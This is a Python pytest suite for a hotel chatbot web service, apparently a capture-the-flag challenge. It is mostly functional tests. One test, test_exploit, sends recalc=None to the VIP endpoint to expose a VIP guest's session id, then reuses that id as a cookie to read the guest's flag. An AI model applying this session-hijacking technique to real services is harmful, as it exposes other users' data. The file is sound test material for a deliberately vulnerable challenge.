import pytest
import requests
import logging
import json
import os
import psycopg2
from psycopg2 import sql

logger = logging.getLogger()
URL = f"http://{os.environ['RINGRING_SERVICE_HOST']}:7353"
SESSION = requests.Session()
CONNECTION_STRING = f"dbname='service' user='ringring' host='{os.environ['PGHOST']}' password={os.environ['PGPASSWORD']}"


def test_main_page():
    r = SESSION.get(URL)
    assert r.status_code == 200
    db_data = get_all_session_from_db()
    assert SESSION.cookies.get('session_id') in db_data


def test_session_id():
    r = SESSION.get(URL)
    assert SESSION.cookies.get('session_id')


def test_alarm_page(check_for_alarm=None, session=SESSION):
    url = URL + '/alarm'
    r = session.get(url)
    assert r.status_code == 200
    if check_for_alarm:
        assert check_for_alarm in r.text


def test_guests_page(is_hidden=False, session_id=None, session=SESSION):
    url = URL + '/guests'
    r = session.get(url)
    if not session_id:
        guest_id = session.cookies.get('session_id')
        assert r.status_code == 200
    else:
        guest_id = session_id
    if is_hidden:
        assert guest_id not in r.text
    else:
        assert guest_id in r.text


def test_invoice_page(check_for_alarm_invoice=False, session=SESSION):
    url = URL + '/invoices'
    r = session.get(url)
    assert r.status_code == 200
    if check_for_alarm_invoice:
        assert 'alarm' in r.text
        assert session.cookies.get('session_id') in r.text


def test_add_alarm(alarm_text='some testing text', session=SESSION):
    url = URL + '/get_bot_response'
    step_1_params = {'msg': 'set alarm'}
    r = session.get(url, params=step_1_params)
    assert r.status_code == 200
    assert 'state' in r.json()
    assert 'mode' in json.loads(r.json()['state'])
    assert json.loads(r.json()['state'])['mode'] == 'alarm'

    step_2_params = {'msg': '12:12', 'state': json.dumps({'mode': 'alarm'})}
    r = session.get(url, params=step_2_params)
    assert r.status_code == 200
    assert json.loads(r.json()['state'])['alarm_time'] == '12:12'
    assert json.loads(r.json()['state'])['mode'] == 'alarm'

    step_3_params = {'msg': alarm_text, 'state': json.dumps({'mode': 'alarm', 'alarm_time': '12:12'})}
    r = session.get(url, params=step_3_params)
    assert r.status_code == 200
    assert json.loads(r.json()['state'])['payment'] == 'pending'
    assert json.loads(r.json()['state'])['mode'] == 'alarm'

    step_4_params = {'msg': 'room-bill', 'state': json.dumps({'mode': 'alarm', 'payment': 'pending'})}
    r = session.get(url, params=step_4_params)
    assert r.status_code == 200
    assert json.loads(r.json()['state'])['mode'] == 'main_menu'

    test_alarm_page(check_for_alarm=alarm_text, session=session)
    test_invoice_page(check_for_alarm_invoice=True, session=session)

    db_data = get_alarm_texts_from_db(session.cookies.get('session_id'))
    assert alarm_text in db_data


def test_bored():
    url = URL + '/get_bot_response'
    params = {'msg': 'I am bored'}
    r = SESSION.get(url, params=params)
    assert r.status_code == 200
    assert '/guests' in r.text


def test_vip():
    url = URL + '/make_me_a_vip'
    SESSION.post(url)
    test_guests_page(is_hidden=True)


@pytest.mark.exploit
def test_exploit():
    # make new vip user
    vip_session = requests.Session()
    non_vip_session = requests.Session()

    vip_session.get(URL)
    vip_session.post(URL + '/make_me_a_vip')
    test_add_alarm(alarm_text='FLAGFLAGFLAG', session=vip_session)

    test_guests_page(is_hidden=True, session_id=vip_session.cookies.get('session_id'))

    non_vip_session.get(URL)
    test_guests_page(is_hidden=False, session_id=non_vip_session.cookies.get('session_id'))

    exploit_params = {'recalc': 'None'}
    vip_session.post(URL + '/make_me_a_vip', data=exploit_params)

    test_guests_page(is_hidden=False, session_id=vip_session.cookies.get('session_id'), session=non_vip_session)
    test_guests_page(is_hidden=False, session_id=non_vip_session.cookies.get('session_id'), session=non_vip_session)

    non_vip_session.cookies.set('session_id', vip_session.cookies.get('session_id'))
    r = non_vip_session.get(URL + '/alarm')
    assert 'FLAGFLAGFLAG' in r.text


def test_vip_not_visible():
    vip_session = requests.Session()
    vip_session.get(URL)
    vip_session.post(URL + '/make_me_a_vip')

    non_vip_session = requests.Session()
    non_vip_session.get(URL)

    test_guests_page(is_hidden=True, session_id=vip_session.cookies.get('session_id'), session=non_vip_session)


def test_db_constraint_working():
    SESSION.get(URL)
    r = SESSION.post(URL + '/make_me_a_vip', data={'recalc': 'bla'})
    assert r.status_code == 200
    assert 'recalc must be either True or False' in r.text

    r = SESSION.post(URL + '/make_me_a_vip', data={'recalc': 'True'})
    assert r.status_code == 500

    r = SESSION.post(URL + '/make_me_a_vip', data={'recalc': 'False'})
    assert r.status_code == 200
    assert 'Success' in r.text


def test_invoice_generation():
    session = requests.session()
    session.get(URL)
    test_add_alarm('invoice_test_alarm', session=session)
    step_1_params = {'msg': 'invoice'}
    url = URL + '/get_bot_response'

    r = session.get(url, params=step_1_params)
    assert r.status_code == 200
    assert 'state' in r.json()
    assert 'mode' in json.loads(r.json()['state'])
    assert json.loads(r.json()['state'])['mode'] == 'invoice'
    assert json.loads(r.json()['state'])['invoice_step'] == '1'

    step_2_params = {'msg': 'bla', 'state': json.dumps({'mode': 'invoice', 'invoice_step': '1'})}
    r = session.get(url, params=step_2_params)
    assert r.status_code == 200
    assert 'Please answer with y or n.' in r.text
    assert json.loads(r.json()['state'])['mode'] == 'invoice'
    assert json.loads(r.json()['state'])['invoice_step'] == '1'

    step_2_params = {'msg': 'y', 'state': json.dumps({'mode': 'invoice', 'invoice_step': '1'})}
    r = session.get(url, params=step_2_params)
    assert r.status_code == 200
    assert 'for a total ammount of <b>1.5' in r.text
    assert json.loads(r.json()['state'])['mode'] == 'main_menu'


def get_alarm_texts_from_db(session_id):
    conn = psycopg2.connect(CONNECTION_STRING)
    cur = conn.cursor()
    query = sql.SQL("""
    SELECT alarm_text, alarm_time FROM ringring.alarms
    WHERE session_id = {session_id}
    """).format(session_id=sql.Literal(session_id))
    cur.execute(query)
    data = []
    for result in cur.fetchall():
        data.append(result[0])
    conn.commit()
    conn.close()

    return data


def get_all_session_from_db():
    conn = psycopg2.connect(CONNECTION_STRING)
    cur = conn.cursor()
    query = sql.SQL("""
        SELECT session_id FROM ringring.sessions;
        """)
    cur.execute(query)
    data = []
    for result in cur.fetchall():
        data.append(result[0])
    conn.commit()
    conn.close()

    return data

